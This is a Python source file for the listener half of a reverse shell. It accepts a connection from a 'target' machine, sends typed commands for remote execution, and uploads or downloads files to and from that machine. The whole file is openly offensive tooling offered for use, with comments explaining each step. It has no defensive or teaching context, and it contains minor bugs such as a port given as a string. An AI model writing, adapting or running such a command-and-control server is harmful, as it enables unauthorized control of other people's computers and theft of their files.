import socket
import json
import os
import subprocess
import time
# This code sets up a server that listens for incoming connections and allows remote command execution.

def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    target.send(jsondata.encode())  # Send the JSON data to the target

def reliable_recv():
    data = ''  # Initialize an empty string to hold received data
    while True:
        try:
            data += target.recv(1024).decode().rstrip()  # Receive data in chunks of 1024 bytes
            return json.loads(data)  # Convert the received JSON data back to Python object
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the file in binary read mode
    target.send(f.read())  # Send the file content to the target
    f.close()  # Close the file after sending

def download_file(file_name):
    f = open(file_name, 'wb')  # Open the file in binary write mode
    target.settimeout(1)  # Set a timeout for receiving data
    chunk = target.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received chunk to the file
        try:
            chunk = target.recv(1024)  # Continue receiving data until no more data is sent
        except socket.timeout as e:  # If a timeout occurs, break the loop
            break
    target.settimeout(None)  # Reset the timeout
    f.close()  # Close the file after writing

def target_communiction():
    while True:

            command = input("* Shell ~%s: " % str(ip))  # Get command input from the user
            reliable_send(command)  # Send the command to the target
            if command == 'exit':  # If the command is 'exit', break the loop
                break
            elif command == 'clear':  # If the command is 'clear', clear the console
                os.system('clear')  # Clear the console
            elif command[:3] == 'cd ':
                os.chdir(command[3:])  # Change directory
            elif command[:8] == 'download':
                download_file(command[9:])  # If the command is 'download', download the specified file
            elif command[:6] == 'upload':
                upload_file(command[7:])  # If the command is 'upload', upload the specified file
            else:
                result = reliable_recv()
                print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('enter LHOST', "LPORT"))  # Replace 'localhost' with the desired host and LPORT with the desired port
print('[+] Listening For The Incoming Connections...')
sock.listen(5)  # Listen for incoming connections, with a backlog of 5
target, ip = sock.accept()  # Accept an incoming connection
print('[+] Connection Established From: ' + str(ip))
target_communiction()  # Start communication with the target
# Note: The above code is a basic server setup.